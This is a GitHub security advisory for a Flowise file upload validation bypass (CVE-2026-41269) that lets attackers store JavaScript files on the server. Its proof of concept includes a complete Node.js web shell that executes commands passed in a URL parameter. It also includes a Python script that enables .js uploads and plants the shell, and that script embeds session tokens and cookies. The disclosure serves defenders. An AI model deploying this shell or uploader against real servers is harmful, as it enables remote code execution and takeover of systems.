# [H] Flowise: File Upload Validation Bypass in createAttachment

## Summary
Severity: High
Advisory: GHSA-rh7v-6w34-w2rr
CVE: CVE-2026-41269
CWE: CWE-434
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-rh7v-6w34-w2rr
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.0

## Details
### Summary
In FlowiseAI, the Chatflow configuration file upload settings can be modified to allow the application/javascript MIME type. This lets an attacker upload .js files even though the frontend doesn’t normally allow JavaScript uploads. This enables attackers to persistently store malicious Node.js web shells on the server, potentially leading to Remote Code Execution (RCE).

### Details
This is a bypass of [GHSA‑35g6‑rrw3‑v6xc](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-35g6-rrw3-v6xc) (CVE‑2025‑61687). The Chatflow file upload settings do not properly validate MIME types. An attacker can add the `application/javascript` MIME type when updating a Chatflow, allowing .js files to be uploaded.

JavaScript files are not listed as an option for file upload types within web user interface:
<img width="1162" height="440" alt="Screenshot 2026-01-08 152306" src="https://github.com/user-attachments/assets/f33f04af-877e-4aac-95a7-86d4684891de" />



### PoC
#### shell.js (Node.js Web Shell)
```
const { exec } = require('child_process');
const http = require('http');

const server = http.createServer((req, res) => {
    const url = new URL(req.url, 'http://localhost');
    const cmd = url.searchParams.get('cmd');

    if (cmd) {
        console.log(`Executing: ${cmd}`);
        exec(cmd, (error, stdout, stderr) => {
            res.writeHead(200, {'Content-Type': 'text/plain'});
            if (error) {
                res.end(`Error: ${error.message}\n${stderr || ''}`);
            } else {
                res.end(stdout || 'Command executed successfully');
            }
        });
    } else {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end(`
            <h1>Node.js Web Shell</h1>
            <p>Use ?cmd=command to execute</p>
            <p>Example: ?cmd=id</p>
        `);
    }
});

const PORT = 8888;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Shell running on port ${PORT}`);
    console.log(`Access: http://localhost:${PORT}?cmd=id`);
});
```

#### Python Upload Script
```
import requests
import uuid

TARGET_URL = "http://192.168.236.131:3000"
CHATFLOW_ID = "dfd67fff-23b5-4f62-a0b3-59963cabc3b2"
cookie_str = 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImEzZGNlMjgyLTE1ZDUtNDYwMi04MjI2LTc1MmQzYzExYzI5NyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiOTRiOGY2MTIyMzI3ZmFmODg0YzM4OGM4Y2YwZTg3ZGU6MTVkNDc4MDFjNTQ0N2Q3NDU2Mzg3OWE2N2E5YmJjNmM0M2JiYjYzNDE0Y2MzZWY2ZThkYjAzZTRhNjM3MjBiNzA5NmI3YmIwMGM3YWI3YTRmM2QzN2E2OTRiMGVmY2UzOTFiZGU3MWJiNWViZDIyN2ZhNzc0NmQ0ZjFmNTM5NTFhOGJkNjdlMzEyZjMzOTk5OWQ0ZGNkYmVmYWU3OWI4NSIsImlhdCI6MTc2Nzg1ODE2NSwibmJmIjoxNzY3ODU4MTY1LCJleHAiOjE3Njc4NjE3NjUsImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.lUtIFztKIT6Ld8cnPaPnPfm0B47yhurPJRW6JhtSwu8; refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImEzZGNlMjgyLTE1ZDUtNDYwMi04MjI2LTc1MmQzYzExYzI5NyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiOThmZGE5YWE2MDZhYTA3YTMxYjZlYzhjZTkyMmZkMDA6ZTU2ZTczMTEwYjY3ZDE3ZTM3MjViZWI2YzMyYWYzNTNkOWExNzIzZWU0NzdiN2ZiMDQ1N2Q0M2JmZTY0NTIxZTlkNjM2ZWQwODgxNWJiNzU4Mjg2ZDQ3OGMwNTA3NTRkZTgwMWIwODljNDQ5YjhhZjVkODU2YWFiMzk4NTBjNjNlZjRmY2UzMmY4YWYzZmQxNGQzMmVhYzVhYjVmM2NjZCIsImlhdCI6MTc2Nzg1MzU4NSwibmJmIjoxNzY3ODUzNTg1LCJleHAiOjE3NzU2Mjk1ODUsImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.U3mm0ONOeGFP1gD-mPT90Iz_Ewwf-YXzmTPwoOEHG_g; connect.sid=s%3Avwp7SDKi02Mzu_nTF3-IZ-RfgmMnnp5o.K7kb5eg9CJ%2FuxupG4rJrT6I0fu0H93OTd5trNC0u88Y'
js_mime_type = 'application/javascript'
CHAT_ID = str(uuid.uuid4())

def configure_chatflow_uploadfile():
    url = f"{TARGET_URL}/api/v1/chatflows/{CHATFLOW_ID}"
    headers = {'Cookie': cookie_str, 'x-request-from': 'internal'}
    chatbot_configdata = {"chatbotConfig":'{\"fullFileUpload\":{\"status\":true,\"allowedUploadFileTypes\":\"' + js_mime_type + ',text/css,text/csv,text/html,application/json,text/markdown,application/x-yaml,application/pdf,application/sql,text/plain,application/xml,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation\",\"pdfFile\":{\"usage\":\"perPage\",\"legacyBuild\":false}}}'}
    r = requests.put(url, headers=headers, json = chatbot_configdata)

    if js_mime_type in r.text:
        print("[+] Enabled .js file uploads")
    else:
        print("[-] Failed to enable .js file uploads")

def upload_shell():
    url = f"{TARGET_URL}/api/v1/attachments/{CHATFLOW_ID}/{CHAT_ID}"
    headers = {'Cookie': cookie_str}
    files = {'files': ('shell.js', open('shell.js', 'rb'), 'application/javascript')}
    r = requests.post(url, headers=headers, files=files)

    if r.status_code == 200:
        print("[+] Upload success")
        print(r.text)
    else:
        print(f"[-] Upload failed ({r.status_code})")
        print(r.text)

if __name__ == "__main__":
    configure_chatflow_uploadfile()
    upload_shell()
```
<img width="839" height="231" alt="image" src="https://github.com/user-attachments/assets/0d2e8384-8da6-4ada-a81a-a85c49476673" />


### Impact
An attacker can persistently upload and store malicious web shells on the server. If executed, this leads to Remote Code Execution (RCE). The risk increases if administrators unknowingly trigger the shell or if other vulnerabilities are chained to execute the file. This presents a high-severity threat to system integrity and confidentiality.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-rh7v-6w34-w2rr
- https://nvd.nist.gov/vuln/detail/CVE-2026-41269
- https://github.com/FlowiseAI/Flowise
